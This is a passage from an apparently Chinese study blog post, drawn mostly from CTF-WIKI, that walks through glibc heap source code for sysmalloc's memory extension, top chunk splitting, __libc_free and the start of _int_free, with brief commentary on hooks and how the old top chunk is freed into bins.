字节，0x20000 字节。</p><h4 id="是否连续"><a href="#是否连续" class="headerlink" title="是否连续"></a>是否连续</h4><p>如果我们希望堆的空间连续的话，那么其实可以复用之前的内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If contiguous, we can subtract out existing space that we hope to</span></span><br><span class="line"><span class="comment">   combine with new space. We add it back later only if</span></span><br><span class="line"><span class="comment">   we don&#x27;t actually get contiguous space.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (contiguous(av))</span><br><span class="line">  size -= old_size;</span><br></pre></td></tr></table></figure><h4 id="对齐页大小"><a href="#对齐页大小" class="headerlink" title="对齐页大小"></a>对齐页大小</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Round to a multiple of page size.</span></span><br><span class="line"><span class="comment">   If MORECORE is not contiguous, this ensures that we only call it</span></span><br><span class="line"><span class="comment">   with whole-page arguments.  And if MORECORE is contiguous and</span></span><br><span class="line"><span class="comment">   this is not first time through, this preserves page-alignment of</span></span><br><span class="line"><span class="comment">   previous calls. Otherwise, we correct to page-align below.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">size = ALIGN_UP(size, pagesize);</span><br></pre></td></tr></table></figure><h4 id="申请内存"><a href="#申请内存" class="headerlink" title="申请内存"></a>申请内存</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Don&#x27;t try to call MORECORE if argument is so big as to appear</span></span><br><span class="line"><span class="comment">   negative. Note that since mmap takes size_t arg, it may succeed</span></span><br><span class="line"><span class="comment">   below even if we cannot call MORECORE.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  brk = (<span class="keyword">char</span> *)(MORECORE(size));</span><br><span class="line">  LIBC_PROBE(memory_sbrk_more, <span class="number">2</span>, brk, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="可能成功"><a href="#可能成功" class="headerlink" title="可能成功"></a>可能成功</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (brk != (<span class="keyword">char</span> *)(MORECORE_FAILURE)) &#123;</span><br><span class="line">  <span class="comment">/* Call the `morecore&#x27; hook if necessary.  */</span></span><br><span class="line">  <span class="keyword">void</span> (*hook)(<span class="keyword">void</span>) = atomic_forced_read(__after_morecore_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    (*hook)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里竟然调用了一个 hook，有点意思。</p><h5 id="失败"><a href="#失败" class="headerlink" title="失败"></a>失败</h5><p>失败，考虑 mmap。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If have mmap, try using it as a backup when MORECORE fails or</span></span><br><span class="line"><span class="comment">         cannot be used. This is worth doing on systems that have &quot;holes&quot; in</span></span><br><span class="line"><span class="comment">         address space, so sbrk cannot extend to give contiguous space, but</span></span><br><span class="line"><span class="comment">         space is available elsewhere.  Note that we ignore mmap max count</span></span><br><span class="line"><span class="comment">         and threshold limits, since the space will not be used as a</span></span><br><span class="line"><span class="comment">         segregated mmap region.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Cannot merge with old top, so add its size back in */</span></span><br><span class="line">      <span class="keyword">if</span> (contiguous(av))</span><br><span class="line">        size = ALIGN_UP(size + old_size, pagesize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If we are relying on mmap as backup, then use larger units */</span></span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(MMAP_AS_MORECORE_SIZE))</span><br><span class="line">        size = MMAP_AS_MORECORE_SIZE;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Don&#x27;t try if size wraps around 0 */</span></span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb)) &#123;</span><br><span class="line">        <span class="keyword">char</span> *mbrk = (<span class="keyword">char</span> *)(MMAP(<span class="number">0</span>, size, PROT_READ | PROT_WRITE, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (mbrk != MAP_FAILED) &#123;</span><br><span class="line">          <span class="comment">/* We do not need, and cannot use, another sbrk call to find end */</span></span><br><span class="line">          brk = mbrk;</span><br><span class="line">          snd_brk = brk + size;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             Record that we no longer have a contiguous sbrk region.</span></span><br><span class="line"><span class="comment">             After the first time mmap is used as backup, we do not</span></span><br><span class="line"><span class="comment">             ever rely on contiguous space since this could incorrectly</span></span><br><span class="line"><span class="comment">             bridge regions.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">          set_noncontiguous(av);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="内存可能申请成功"><a href="#内存可能申请成功" class="headerlink" title="内存可能申请成功"></a>内存可能申请成功</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (brk != (<span class="keyword">char</span> *)(MORECORE_FAILURE)) &#123;</span><br><span class="line">  <span class="keyword">if</span> (mp_.sbrk_base == <span class="number">0</span>)</span><br><span class="line">    mp_.sbrk_base = brk;</span><br><span class="line">  av-&gt;system_mem += size;</span><br></pre></td></tr></table></figure><h5 id="情况-1"><a href="#情况-1" class="headerlink" title="情况 1"></a>情况 1</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If MORECORE extends previous space, we can likewise extend top size.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (brk == old_end &amp;&amp; snd_brk == (<span class="keyword">char</span> *)(MORECORE_FAILURE))</span><br><span class="line">  set_head(old_top, (size + old_size) | PREV_INUSE);</span><br></pre></td></tr></table></figure><h5 id="情况-2-意外内存耗尽"><a href="#情况-2-意外内存耗尽" class="headerlink" title="情况 2 - 意外内存耗尽"></a>情况 2 - 意外内存耗尽</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (contiguous(av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end)</span><br><span class="line">  <span class="comment">/* Oops!  Someone else killed our space..  Can&#x27;t touch anything.  */</span></span><br><span class="line">  malloc_printerr(<span class="string">&quot;break adjusted to free malloc space&quot;</span>);</span><br></pre></td></tr></table></figure><h5 id="处理其他意外情况"><a href="#处理其他意外情况" class="headerlink" title="处理其他意外情况"></a>处理其他意外情况</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Otherwise, make adjustments:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> * If the first time through or noncontiguous, we need to call sbrk</span></span><br><span class="line"><span class="comment">    just to find out where the end of memory lies.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> * We need to ensure that all returned chunks from malloc will meet</span></span><br><span class="line"><span class="comment">    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> * If there was an intervening foreign sbrk, we need to adjust sbrk</span></span><br><span class="line"><span class="comment">    request size to account for fact that we will not be able to</span></span><br><span class="line"><span class="comment">    combine new space with existing space in old_top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> * Almost all systems internally allocate whole pages at a time, in</span></span><br><span class="line"><span class="comment">    which case we might as well use the whole last page of request.</span></span><br><span class="line"><span class="comment">    So we allocate enough more memory to hit a page boundary now,</span></span><br><span class="line"><span class="comment">    which in turn causes future contiguous calls to page-align.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  front_misalign = <span class="number">0</span>;</span><br><span class="line">  end_misalign = <span class="number">0</span>;</span><br><span class="line">  correction = <span class="number">0</span>;</span><br><span class="line">  aligned_brk = brk;</span><br></pre></td></tr></table></figure><h6 id="处理连续内存"><a href="#处理连续内存" class="headerlink" title="处理连续内存"></a>处理连续内存</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* handle contiguous cases */</span></span><br><span class="line"><span class="keyword">if</span> (contiguous(av)) &#123;</span><br><span class="line">  <span class="comment">/* Count foreign sbrk as system_mem.  */</span></span><br><span class="line">  <span class="keyword">if</span> (old_size)</span><br><span class="line">    av-&gt;system_mem += brk - old_end;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Guarantee alignment of first new chunk made from this space */</span></span><br><span class="line"></span><br><span class="line">  front_misalign = (INTERNAL_SIZE_T)chunk2mem(brk) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">  <span class="keyword">if</span> (front_misalign &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       Skip over some bytes to arrive at an aligned position.</span></span><br><span class="line"><span class="comment">       We don&#x27;t need to specially mark these wasted front bytes.</span></span><br><span class="line"><span class="comment">       They will never be accessed anyway because</span></span><br><span class="line"><span class="comment">       prev_inuse of av-&gt;top (and any chunk created from its start)</span></span><br><span class="line"><span class="comment">       is always true after initialization.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    correction = MALLOC_ALIGNMENT - front_misalign;</span><br><span class="line">    aligned_brk += correction;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this isn&#x27;t adjacent to existing space, then we will not</span></span><br><span class="line"><span class="comment">     be able to merge with old_top space, so must add to 2nd request.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  correction += old_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Extend the end address to hit a page boundary */</span></span><br><span class="line">  end_misalign = (INTERNAL_SIZE_T)(brk + size + correction);</span><br><span class="line">  correction += (ALIGN_UP(end_misalign, pagesize)) - end_misalign;</span><br><span class="line"></span><br><span class="line">  assert(correction &gt;= <span class="number">0</span>);</span><br><span class="line">  snd_brk = (<span class="keyword">char</span> *)(MORECORE(correction));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If can&#x27;t allocate correction, try to at least find out current</span></span><br><span class="line"><span class="comment">     brk.  It might be enough to proceed without failing.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     Note that if second sbrk did NOT fail, we assume that space</span></span><br><span class="line"><span class="comment">     is contiguous with first sbrk. This is a safe assumption unless</span></span><br><span class="line"><span class="comment">     program is multithreaded but doesn&#x27;t use locks and a foreign sbrk</span></span><br><span class="line"><span class="comment">     occurred between our first and second calls.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (snd_brk == (<span class="keyword">char</span> *)(MORECORE_FAILURE)) &#123;</span><br><span class="line">    correction = <span class="number">0</span>;</span><br><span class="line">    snd_brk = (<span class="keyword">char</span> *)(MORECORE(<span class="number">0</span>));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* Call the `morecore&#x27; hook if necessary.  */</span></span><br><span class="line">    <span class="keyword">void</span> (*hook)(<span class="keyword">void</span>) = atomic_forced_read(__after_morecore_hook);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">      (*hook)();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="处理不连续内存"><a href="#处理不连续内存" class="headerlink" title="处理不连续内存"></a>处理不连续内存</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* handle non-contiguous cases */</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (MALLOC_ALIGNMENT == <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">    <span class="comment">/* MORECORE/mmap must correctly align */</span></span><br><span class="line">    assert(((<span class="keyword">unsigned</span> <span class="keyword">long</span>)chunk2mem(brk) &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    front_misalign =</span><br><span class="line">        (INTERNAL_SIZE_T)chunk2mem(brk) &amp; MALLOC_ALIGN_MASK;</span><br><span class="line">    <span class="keyword">if</span> (front_misalign &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Skip over some bytes to arrive at an aligned position.</span></span><br><span class="line"><span class="comment">         We don&#x27;t need to specially mark these wasted front bytes.</span></span><br><span class="line"><span class="comment">         They will never be accessed anyway because</span></span><br><span class="line"><span class="comment">         prev_inuse of av-&gt;top (and any chunk created from its start)</span></span><br><span class="line"><span class="comment">         is always true after initialization.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      aligned_brk += MALLOC_ALIGNMENT - front_misalign;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Find out current end of memory */</span></span><br><span class="line">  <span class="keyword">if</span> (snd_brk == (<span class="keyword">char</span> *)(MORECORE_FAILURE)) &#123;</span><br><span class="line">    snd_brk = (<span class="keyword">char</span> *)(MORECORE(<span class="number">0</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="调整"><a href="#调整" class="headerlink" title="调整"></a>调整</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/* Adjust top based on results of second sbrk */</span></span><br><span class="line">  <span class="keyword">if</span> (snd_brk != (<span class="keyword">char</span> *)(MORECORE_FAILURE)) &#123;</span><br><span class="line">    av-&gt;top = (mchunkptr)aligned_brk;</span><br><span class="line">    set_head(av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE);</span><br><span class="line">    av-&gt;system_mem += correction;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       If not the first time through, we either have a</span></span><br><span class="line"><span class="comment">       gap due to foreign sbrk or a non-contiguous region.  Insert a</span></span><br><span class="line"><span class="comment">       double fencepost at old_top to prevent consolidation with space</span></span><br><span class="line"><span class="comment">       we don&#x27;t own. These fenceposts are artificial chunks that are</span></span><br><span class="line"><span class="comment">       marked as inuse and are in any case too small to use.  We need</span></span><br><span class="line"><span class="comment">       two to make sizes and alignments work out.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (old_size != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Shrink old_top to insert fenceposts, keeping size a</span></span><br><span class="line"><span class="comment">         multiple of MALLOC_ALIGNMENT. We know there is at least</span></span><br><span class="line"><span class="comment">         enough space in old_top to do this.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      old_size = (old_size - <span class="number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">      set_head(old_top, old_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Note that the following assignments completely overwrite</span></span><br><span class="line"><span class="comment">         old_top when old_size was previously MINSIZE.  This is</span></span><br><span class="line"><span class="comment">         intentional. We need the fencepost, even if old_top otherwise</span></span><br><span class="line"><span class="comment">         gets lost.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      set_head(chunk_at_offset(old_top, old_size),</span><br><span class="line">               (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">      set_head(chunk_at_offset(old_top, old_size + <span class="number">2</span> * SIZE_SZ),</span><br><span class="line">               (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If possible, release the rest. */</span></span><br><span class="line">      <span class="keyword">if</span> (old_size &gt;= MINSIZE) &#123;</span><br><span class="line">        _int_free(av, old_top, <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是，在这里程序将旧的 top chunk 进行了释放，那么其会根据大小进入不同的 bin 或 tcache 中。</p><h4 id="更新最大内存"><a href="#更新最大内存" class="headerlink" title="更新最大内存"></a>更新最大内存</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)av-&gt;system_mem &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(av-&gt;max_system_mem))</span><br><span class="line">  av-&gt;max_system_mem = av-&gt;system_mem;</span><br><span class="line">check_malloc_state(av);</span><br></pre></td></tr></table></figure><h4 id="分配内存块"><a href="#分配内存块" class="headerlink" title="分配内存块"></a>分配内存块</h4><h5 id="获取大小"><a href="#获取大小" class="headerlink" title="获取大小"></a>获取大小</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* finally, do the allocation */</span></span><br><span class="line">p = av-&gt;top;</span><br><span class="line">size = chunksize(p);</span><br></pre></td></tr></table></figure><h5 id="切分-TOP"><a href="#切分-TOP" class="headerlink" title="切分 TOP"></a>切分 TOP</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* check that one of the above allocation paths succeeded */</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb + MINSIZE)) &#123;</span><br><span class="line">  remainder_size = size - nb;</span><br><span class="line">  remainder = chunk_at_offset(p, nb);</span><br><span class="line">  av-&gt;top = remainder;</span><br><span class="line">  set_head(p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">  set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">  check_malloced_chunk(av, p, nb);</span><br><span class="line">  <span class="keyword">return</span> chunk2mem(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="捕捉所有错误"><a href="#捕捉所有错误" class="headerlink" title="捕捉所有错误"></a>捕捉所有错误</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* catch all failure paths */</span></span><br><span class="line">__set_errno(ENOMEM);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h1 id="释放内存块"><a href="#释放内存块" class="headerlink" title="释放内存块"></a>释放内存块</h1><blockquote><p>Free Heap Memory</p><p>绝大部分内容来自 CTF-WIKI ，内容引用用于学习记录</p></blockquote><h2 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h2><p>类似于 malloc，free 函数也有一层封装，命名格式与 malloc 基本类似。代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __libc_free(<span class="keyword">void</span> *mem) &#123;</span><br><span class="line">    mstate    ar_ptr;</span><br><span class="line">    mchunkptr p; <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line">    <span class="comment">// 判断是否有钩子函数 __free_hook</span></span><br><span class="line">    <span class="keyword">void</span> (*hook)(<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *) = atomic_forced_read(__free_hook);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="comment">//执行hook函数然后返回</span></span><br><span class="line">        (*hook)(mem, RETURN_ADDRESS(<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// free NULL没有作用</span></span><br><span class="line">    <span class="keyword">if</span> (mem == <span class="number">0</span>) <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 将mem转换为chunk状态</span></span><br><span class="line">    p = mem2chunk(mem);</span><br><span class="line">    <span class="comment">// 如果该块内存是mmap得到的</span></span><br><span class="line">    <span class="keyword">if</span> (chunk_is_mmapped(p)) <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span></span><br><span class="line"><span class="comment">       Dumped fake mmapped chunks do not affect the threshold.  */</span></span><br><span class="line">        <span class="keyword">if</span> (!mp_.no_dyn_threshold &amp;&amp; chunksize_nomask(p) &gt; mp_.mmap_threshold &amp;&amp;</span><br><span class="line">            chunksize_nomask(p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX &amp;&amp;</span><br><span class="line">            !DUMPED_MAIN_ARENA_CHUNK(p)) &#123;</span><br><span class="line">            mp_.mmap_threshold = chunksize(p);</span><br><span class="line">            mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">            LIBC_PROBE(memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                       mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">        munmap_chunk(p);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 根据chunk获得分配区的指针</span></span><br><span class="line">    ar_ptr = arena_for_chunk(p);</span><br><span class="line">    <span class="comment">// 执行释放</span></span><br><span class="line">    _int_free(ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><p>函数初始时刻定义了一系列的变量，并且得到了用户想要释放的 chunk 的大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 